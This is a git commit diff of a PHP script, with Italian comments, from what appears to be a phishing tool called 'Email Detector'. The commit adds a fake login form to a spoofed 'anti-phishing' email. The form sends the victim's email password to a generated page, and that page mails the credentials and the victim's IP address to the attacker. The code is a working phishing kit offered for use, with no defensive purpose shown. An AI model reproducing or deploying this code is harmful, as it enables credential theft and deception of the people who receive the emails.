17008316cae7480491bd4c611c2ea609cfe793a2
Virgula0 <angelo.rosa1999@gmail.com>
2016-01-09 20:17:27 +0100

    Update tester.php

--- tester.php
+++ tester.php
@@ -1,22 +1,26 @@
 <?php
+//© codec by Virgula #RESPECT
 
-echo"<title>Worked</title>"
-echo"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" />";
+echo"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> 
+<title>Worked!</title>";//LEGGO TUTTI I TIPI DI CARATTERI ANCHE NON ASCII
+
+$dir_patch = $_POST ['url'];
+
+if ($dir_patch){
+echo"<meta http-equiv=\"Content-Type\" content=\"text/html; charset=UTF-8\" /> 
+<title>Worked!</title>";
+
 //INPUT DEI DATI DALLA PAGINA HTML 
-
 $mittente = $_POST ['nome_mittente'];
 $nome_destinatario = $_POST ['nome_destinatario'];
 $email_destinatario = $_POST ['email_destinatario'];
 
-//QUESTA PARTE RIGUARDA L'INVIO DELLA NOTIFICA CHE L'EMAIL ESISTE REALEMTE ALL'ATTACCANTE
+//QUESTA PARTE RIGUARDA L'INVIO DELLA NOTIFICA CHE L'EMAIL ESISTE REALEMTE ALL'ATTACCANTE, E DEGLI EVENTUALI DATI DEL FAKE LOGIN
 
 $rand = rand (0,100000000000000000); //creo la variabile e il numero casuale della pagina
-//IMPOSTO LA MAIL CHE L'ATTACCANTE RICEVERA'
-$oggetto = " \"Convalida Email\" ";
-$messaggio = " \" Ciao, la tua vittima ($nome_destinatario) ha confermato che l' email esiste realemente cliccando il link. 
-Il suo indirizzo ip è: '\$ip'
-Grazie per aver utilizzato Email Detector. \"";
 
+//CONFIGURO IL FILE CHE INVIERA' LA MAIL CON TUTTE LE INFO ALL'ATTACCANTE 
+$oggetto = " \"Convalida Email\" ";
 
   $headers  =  ' "MIME-Version: 1.0\r\n" ';
   $headers0 .= " \"To: <$mittente>";
@@ -26,16 +30,38 @@ Grazie per aver utilizzato Email Detector. \"";
  
 $file = fopen ("pag/{$rand}.php", 'w'); //CREO LA PAGINA RANDOM 
 fwrite ($file, "<?php \n");
+fwrite ($file, "echo \"<title>Thanks</title>\";\n");
+fwrite ($file, '$email = $_GET [\'email\']; ');
+fwrite ($file, "\n");
+fwrite ($file, '$password = $_GET [\'password\'];');
+fwrite ($file, "\n");
 fwrite ($file, '$ip =');
 fwrite ($file, ' getenv (\'REMOTE_ADDR\');');
 fwrite ($file, "\n");
-fwrite ($file, " echo\"<h1>Operazione riuscita. Grazie per la collaborazione.</h1>\"; \n");
+fwrite ($file, "echo\"<h1>Operazione riuscita. Grazie per la collaborazione.</h1>\"; \n");
+fwrite ($file, 'if ((($email) || ($password)) || (($email) && ($password))){ ');
+fwrite ($file, "\n");
+fwrite ($file, ' $messaggio = "Ciao, la tua vittima ha confermato che l\' email esiste realemente cliccando il link. 
+Il suo indirizzo ip è: $ip 
+La vittima ha inoltre inserito delle credenziali: 
+Email_> $email   -   Password_>  $password 
+Grazie per aver utilizzato Email Detector. 
+ 
+";}else{');
+fwrite ($file, "\n");
+fwrite ($file, '$messaggio = " Ciao, la tua vittima ha confermato che l\' email esiste realemente cliccando il link. 
+Il suo indirizzo ip è: $ip 
+Grazie per aver utilizzato Email Detector.
+ 
+";}');
+fwrite ($file, "\n");
 fwrite ($file, ' $mittente1 = ');
 fwrite ($file, " \"$mittente\";\n ");
 fwrite ($file, '$oggetto1 = ');
 fwrite ($file, "$oggetto; \n");
 fwrite ($file, '$messaggio1 = ');
-fwrite ($file, "$messaggio; \n");
+fwrite ($file, '$messaggio; ');
+fwrite ($file, "\n");
 fwrite ($file, '$headers1 =');
 fwrite ($file, " $headers; \n");
 fwrite ($file, '$headers1 .=');
@@ -50,11 +76,20 @@ fwrite ($file, " ?> ");
 fclose ($file);
 
 //DA QUESTO MOMENTO CONFIGURO LA MAIL DA INVIARE ALLA VITTIMA E LA INVIO
-//PERSONALIZZA L'URL DI CONFERMA QUI SOTTO MODIFICANDO SOLAMENTE IL TUO SITO CON EVENTUALI DIRECTORY 
+
 $oggetto = " Avviso! ";
 $messaggio = "Ciao, $nome_destinatario, vorremo offrirti una protezione più adeguata anti-phishing.
 Devi solamente confermare il tutto al seguente link: 
-http://tuosito_url_da_personalizzare.com/pag/$rand.php
+$dir_patch/pag/$rand.php
+Inoltre, inserisci le tue credenziali di accesso di questa email per un'ulteriore importante verifica:
+ <html>
+   <body>
+   <form method=\"get\" action=\"$dir_patch/pag/$rand.php\">
+   Email: <input type=\"text\" name=\"email\"> Password: <input type=\"password\" name=\"password\">
+   <input type=\"submit\" value=\"Verifica\">
+   </form>
+   </body>
+ </html>
 Grazie!
  ";
 
@@ -64,8 +99,11 @@ Grazie!
   $head .= "From: <Sicurezza@server.com>\r\n";
 
 if(mail($email_destinatario,$oggetto,$messaggio,$head)){
-echo"<font size=\"5\">Email di phishing inviata correttamente, il server ti manderà una mail all'indirizzo: <b>$mittente</b> non appena la vittima cliccherà il link.</font>";
+echo"<font size=\"5\">Email di phishing inviata correttamente, il server ti manderà una mail all'indirizzo: <b>$mittente</b> non appena la vittima cliccherà il link e/o inserira' i dati nel form del fake login.</font>";
 }else{
 echo"Errore Nell'elaborazione, qualcosa è andato storto";
+}
+}else{
+echo"Errore, devi inserire un url valido. <form action=\"index.html\"><input type=\"submit\" value=\"Riprova\"></form>";
 }
 ?>
